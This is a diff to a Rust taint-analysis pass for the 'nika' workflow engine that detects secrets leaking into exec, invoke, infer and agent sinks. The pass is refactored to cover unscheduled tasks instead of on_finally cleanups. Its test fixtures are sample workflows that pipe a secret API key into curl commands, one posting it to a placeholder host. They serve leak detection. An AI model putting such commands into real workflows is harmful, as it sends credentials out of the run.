@@ -123,13 +123,6 @@ pub struct FlowFacts {
     effect_leak: BTreeMap<usize, TaintTrace>,
     /// Task index → the taint of its OUTPUT (`tasks.<id>.output`).
     output_taint: BTreeMap<usize, TaintTrace>,
-    /// Owner task index → the FIRST UNSANCTIONED taint reaching one of its
-    /// `on_finally` cleanup effects, with the sink kind (`exec`/`invoke`)
-    /// and the cleanup's index within `on_finally`. A cleanup whose egress
-    /// is author-sanctioned (declass · ADR-092) is skipped here exactly
-    /// like a sanctioned main effect. Cleanups run under the same boundary
-    /// and ALWAYS run.
-    finally_effect_taint: BTreeMap<usize, (TaintTrace, &'static str, usize)>,
     /// Workflow `outputs:` entry name → the taint reaching it (egress).
     egress: BTreeMap<String, TaintTrace>,
 }
@@ -153,13 +146,6 @@ impl FlowFacts {
     /// The taint reaching one of `task`'s `on_finally` cleanup effects,
     /// with the sink kind (`exec`/`invoke`) and the cleanup's index within
     /// `on_finally` (the declassification check reads that exact action).
-    #[must_use]
-    pub fn finally_effect_taint(&self, task: usize) -> Option<(&TaintTrace, &'static str, usize)> {
-        self.finally_effect_taint
-            .get(&task)
-            .map(|(trace, sink, cleanup_idx)| (trace, *sink, *cleanup_idx))
-    }
-
     /// Every workflow-output egress (name → trace), sorted by name.
     #[must_use]
     pub fn egresses(&self) -> Vec<(&str, &TaintTrace)> {
@@ -199,6 +185,27 @@ pub(super) fn analyze_flow(wf: &RawWorkflow, waves: &[Vec<usize>]) -> FlowFacts 
                 idx, task, &declared, &egress_of, permits, &id_of, &mut facts,
             );
         }
+    }
+
+    // …then the UNWIND tasks, which carry effects but never enter wave
+    // assignment (spec 03 · E_f never schedules). The waves are this
+    // pass's ORDERING device, not its census: a task missing from them
+    // is a task no judge sees, and an unseen effect carrier is exactly
+    // the hole `unwind` was minted to close. They run after their
+    // producer settles, so appending them here IS their order.
+    //
+    // This replaces the old `on_finally` special case: the compensation
+    // is gone because the units are ordinary tasks now, but the ORDERING
+    // still has to name them.
+    let seen: BTreeSet<usize> = waves.iter().flatten().copied().collect();
+    for idx in 0..wf.tasks.len() {
+        if seen.contains(&idx) {
+            continue;
+        }
+        let task = &wf.tasks[idx].value;
+        propagate_task(
+            idx, task, &declared, &egress_of, permits, &id_of, &mut facts,
+        );
     }
 
     // Egress: a workflow `outputs:` entry referencing a tainted slot —
@@ -304,84 +311,10 @@ fn propagate_task(
 
     // 5. `on_finally` cleanup effects are sinks too (extracted for the
     //    100-LOC fn cap · same env / same declass filter as the main effect).
-    propagate_cleanups(
-        idx,
-        task,
-        declared,
-        egress_of,
-        permits,
-        &with_taint,
-        item_taint.as_ref(),
-        id_of,
-        facts,
-    );
 }
 
 /// Record the FIRST UNSANCTIONED `on_finally` cleanup leak of a task. A
 /// cleanup `exec`/`invoke` that sees a secret re-emits it exactly like a
-/// main effect (and a cleanup ALWAYS runs). Same `with`/`item` env;
-/// cleanups have no addressable output, so no output taint here. A cleanup
-/// whose egress is author-sanctioned is skipped (declass · ADR-092), and
-/// scanning continues so a sanctioned cleanup never masks a later leak.
-#[allow(clippy::too_many_arguments)] // the IFC pass threads a wide context
-fn propagate_cleanups(
-    idx: usize,
-    task: &RawTask,
-    declared: &BTreeSet<&str>,
-    egress_of: &BTreeMap<&str, &[EgressRule]>,
-    permits: Option<&Permits>,
-    with_taint: &BTreeMap<&str, TaintTrace>,
-    item_taint: Option<&TaintTrace>,
-    id_of: &BTreeMap<&str, usize>,
-    facts: &mut FlowFacts,
-) {
-    for (cleanup_idx, cleanup) in task.on_finally.iter().enumerate() {
-        if facts.finally_effect_taint.contains_key(&idx) {
-            break; // any one tainted cleanup is enough to flag the task
-        }
-        let action = &cleanup.value.action;
-        let sink = match action {
-            RawAction::Exec(_) => "exec",
-            RawAction::Invoke(_) => "invoke",
-            // A cleanup infer/agent prompt is a provider-egress sink too
-            // (BUG#3 · sanctioned via `to: "infer"`/`"agent"`). A cleanup
-            // ALWAYS runs, so a secret in its prompt always leaves the run.
-            RawAction::Infer(_) => "infer",
-            RawAction::Agent(_) => "agent",
-            #[allow(
-                clippy::unreachable,
-                reason = "non_exhaustive future variant — enum and checker ship together; fail loud beats silently-wrong output"
-            )]
-            other => unreachable!("unknown action: {other:?}"),
-        };
-        if let Some(trace) = action_effect_fields(action).into_iter().find_map(|text| {
-            taint_of_refs_full(
-                refs_in_str(text),
-                declared,
-                with_taint,
-                item_taint,
-                id_of,
-                facts,
-            )
-        }) {
-            // A cleanup whose egress is author-sanctioned is no leak — skip
-            // it (and keep scanning later cleanups for a real one).
-            let egress = egress_of.get(trace.secret.as_str()).copied().unwrap_or(&[]);
-            if declass::is_sanctioned(&trace.secret, egress, action, permits) {
-                continue;
-            }
-            facts.finally_effect_taint.insert(
-                idx,
-                (
-                    trace.via(format!("on_finally @ {}", task.id.value)),
-                    sink,
-                    cleanup_idx,
-                ),
-            );
-        }
-    }
-}
-
 /// The text fields of an action's EFFECT (the sink surface) — works for a
 /// task's main verb AND an `on_finally` cleanup verb.
 ///
@@ -573,7 +506,7 @@ mod tests {
     #[test]
     fn direct_secret_into_exec_is_effect_tainted() {
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    exec: {{ shell: \"curl -H ${{{{ secrets.api_key }}}}\" }}\n"
+            "nika: w\n{S}tasks:\n  t:\n    exec: {{ shell: \"curl -H ${{{{ secrets.api_key }}}}\" }}\n"
         );
         let (wf, f) = facts(&y);
         assert!(f.effect_taint(idx(&wf, "t")).is_some());
@@ -591,7 +524,7 @@ mod tests {
         // guard is completion — a regression to O(N²) makes this test crawl.
         use std::fmt::Write as _;
         const N: usize = 3_000;
-        let mut y = format!("nika: v1\nworkflow:\n  id: w\n{S}tasks:\n");
+        let mut y = format!("nika: w\n{S}tasks:\n");
         y.push_str("  t0:\n    exec: { command: [\"echo\", \"${{ secrets.api_key }}\"] }\n");
         for k in 1..N {
             let p = k - 1;
@@ -622,7 +555,7 @@ mod tests {
         // The false negative the review found: with: { tok: secret } then
         // ${{ with.tok }} into exec — one hop the old substring scan missed.
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    with: {{ tok: \"${{{{ secrets.api_key }}}}\" }}\n    exec: {{ shell: \"curl -H ${{{{ with.tok }}}}\" }}\n"
+            "nika: w\n{S}tasks:\n  t:\n    with: {{ tok: \"${{{{ secrets.api_key }}}}\" }}\n    exec: {{ shell: \"curl -H ${{{{ with.tok }}}}\" }}\n"
         );
         let (wf, f) = facts(&y);
         let trace = f
@@ -637,34 +570,11 @@ mod tests {
     }
 
     #[test]
-    fn secret_into_on_finally_cleanup_is_a_sink() {
-        // A cleanup exec that sees a secret re-emits it like a main effect —
-        // and a cleanup ALWAYS runs (the review's PROVEN blind spot).
-        let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    exec: {{ command: [\"echo\", \"build\"] }}\n    on_finally:\n      - exec: {{ shell: \"curl -d ${{{{ secrets.api_key }}}} x\" }}\n"
-        );
-        let (wf, f) = facts(&y);
-        assert!(
-            f.effect_taint(idx(&wf, "t")).is_none(),
-            "the MAIN effect is clean"
-        );
-        let (trace, sink, _cleanup_idx) = f
-            .finally_effect_taint(idx(&wf, "t"))
-            .expect("cleanup taint caught");
-        assert_eq!(sink, "exec");
-        assert!(
-            trace.render().contains("on_finally"),
-            "trace marks the cleanup hop: {}",
-            trace.render()
-        );
-    }
-
-    #[test]
     fn taint_propagates_transitively_through_task_output() {
         // a leaks secret into its exec → a.output tainted → b consuming
         // a.output into ITS exec is also tainted (transitive, via the DAG).
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\n  b:\n    with: {{ upstream: \"${{{{ tasks.a.output }}}}\" }}\n    exec: {{ shell: \"echo ${{{{ with.upstream }}}}\" }}\n"
+            "nika: w\n{S}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\n  b:\n    with: {{ upstream: \"${{{{ tasks.a.output }}}}\" }}\n    exec: {{ shell: \"echo ${{{{ with.upstream }}}}\" }}\n"
         );
         let (wf, f) = facts(&y);
         let tb = f.effect_taint(idx(&wf, "b")).expect("transitive taint");
@@ -682,7 +592,7 @@ mod tests {
         // a third-party provider) — but the model's RESPONSE is NOT tainted
         // (not a verbatim echo · the OUTPUT carve-out is preserved · ADR-092).
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  a:\n    infer: {{ prompt: \"use ${{{{ secrets.api_key }}}}\", max_tokens: 10 }}\n  b:\n    with: {{ upstream: \"${{{{ tasks.a.output }}}}\" }}\n    exec: {{ shell: \"echo ${{{{ with.upstream }}}}\" }}\n"
+            "nika: w\n{S}tasks:\n  a:\n    infer: {{ prompt: \"use ${{{{ secrets.api_key }}}}\", max_tokens: 10 }}\n  b:\n    with: {{ upstream: \"${{{{ tasks.a.output }}}}\" }}\n    exec: {{ shell: \"echo ${{{{ with.upstream }}}}\" }}\n"
         );
         let (wf, f) = facts(&y);
         // The prompt is now a sink (an unsanctioned provider egress · leak).
@@ -703,9 +613,7 @@ mod tests {
         // stays tainted, outputs is where it LEAVES — `to: "outputs"` is
         // the owner's declassification of the workflow boundary itself.
         let y = "\
-nika: v1
-workflow:
-  id: w
+nika: w
 secrets:
   api_key:
     source: vault
@@ -732,9 +640,7 @@ outputs:
     fn outputs_egress_stays_default_deny_without_the_rule() {
         // Same workflow, no `to: "outputs"` — the report STANDS.
         let y = "\
-nika: v1
-workflow:
-  id: w
+nika: w
 secrets:
   api_key:
     source: vault
@@ -758,9 +664,7 @@ outputs:
         // `to: "outputs"` ALONE: the boundary is cleared but the SEND to
         // nika:fetch is still an unsanctioned leak (no cross-sink grant).
         let y = "\
-nika: v1
-workflow:
-  id: w
+nika: w
 secrets:
   api_key:
     source: vault
@@ -787,9 +691,7 @@ outputs:
     fn sanctioned_infer_prompt_is_not_a_leak() {
         // BUG#3: an explicit `to: "infer"` egress sanctions the prompt send.
         let y = "\
-nika: v1
-workflow:
-  id: w
+nika: w
 secrets:
   api_key:
     source: vault
@@ -811,7 +713,7 @@ tasks:
     fn secret_reaching_outputs_is_an_egress() {
         // a secret leaving the run as the return value — the literal exfil.
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\noutputs:\n  leaked: ${{{{ tasks.a.output }}}}\n"
+            "nika: w\n{S}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\noutputs:\n  leaked: ${{{{ tasks.a.output }}}}\n"
         );
         let (_wf, f) = facts(&y);
         let eg = f.egresses();
@@ -825,7 +727,7 @@ tasks:
         // for_each over a tainted upstream output → item is tainted → an
         // exec using ${{ item }} re-emits it.
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\n  b:\n    with: {{ items: \"${{{{ tasks.a.output }}}}\" }}\n    for_each: ${{{{ with.items }}}}\n    exec: {{ shell: \"echo ${{{{ item }}}}\" }}\n"
+            "nika: w\n{S}tasks:\n  a:\n    exec: {{ shell: \"echo ${{{{ secrets.api_key }}}}\" }}\n  b:\n    with: {{ items: \"${{{{ tasks.a.output }}}}\" }}\n    for_each: {{ items: \"${{{{ with.items }}}}\" }}\n    exec: {{ shell: \"echo ${{{{ item }}}}\" }}\n"
         );
         let (wf, f) = facts(&y);
         assert!(
@@ -836,7 +738,7 @@ tasks:
 
     #[test]
     fn no_secrets_declared_is_empty() {
-        let y = "nika: v1\nworkflow:\n  id: w\ntasks:\n  t:\n    exec: { command: [\"echo\", \"hi\"] }\n";
+        let y = "nika: w\ntasks:\n  t:\n    exec: { command: [\"echo\", \"hi\"] }\n";
         let (_wf, f) = facts(y);
         assert!(f.effect_taint(0).is_none());
         assert!(f.egresses().is_empty());
@@ -849,7 +751,7 @@ tasks:
         // requires an explicit `to: "infer"` egress (see
         // `sanctioned_infer_prompt_is_not_a_leak`).
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    infer: {{ prompt: \"hi ${{{{ secrets.api_key }}}}\", max_tokens: 5 }}\n"
+            "nika: w\n{S}tasks:\n  t:\n    infer: {{ prompt: \"hi ${{{{ secrets.api_key }}}}\", max_tokens: 5 }}\n"
         );
         let (wf, f) = facts(&y);
         let leak = f
@@ -865,7 +767,7 @@ tasks:
     fn agent_prompt_is_a_sink_too() {
         // BUG#3: the agent verb's prompt is the same provider-egress sink.
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    agent: {{ prompt: \"do ${{{{ secrets.api_key }}}}\", max_turns: 2 }}\n"
+            "nika: w\n{S}tasks:\n  t:\n    agent: {{ prompt: \"do ${{{{ secrets.api_key }}}}\", max_turns: 2 }}\n"
         );
         let (wf, f) = facts(&y);
         assert!(
@@ -878,7 +780,7 @@ tasks:
     fn secret_in_infer_system_field_is_a_sink() {
         // The `system:` field is part of the prompt egress surface too.
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    infer: {{ prompt: \"go\", system: \"key ${{{{ secrets.api_key }}}}\", max_tokens: 5 }}\n"
+            "nika: w\n{S}tasks:\n  t:\n    infer: {{ prompt: \"go\", system: \"key ${{{{ secrets.api_key }}}}\", max_tokens: 5 }}\n"
         );
         let (wf, f) = facts(&y);
         assert!(
@@ -897,7 +799,7 @@ tasks:
         // drops the array's strings, so the secret is invisible and the
         // effect wrongly reads clean.
         let y = format!(
-            "nika: v1\nworkflow:\n  id: w\n{S}tasks:\n  t:\n    invoke: {{ tool: \"mcp:srv/run\", args: {{ items: [\"${{{{ secrets.api_key }}}}\"] }} }}\n"
+            "nika: w\n{S}tasks:\n  t:\n    invoke: {{ tool: \"mcp:srv/run\", args: {{ items: [\"${{{{ secrets.api_key }}}}\"] }} }}\n"
         );
         let (wf, f) = facts(&y);
         let trace = f
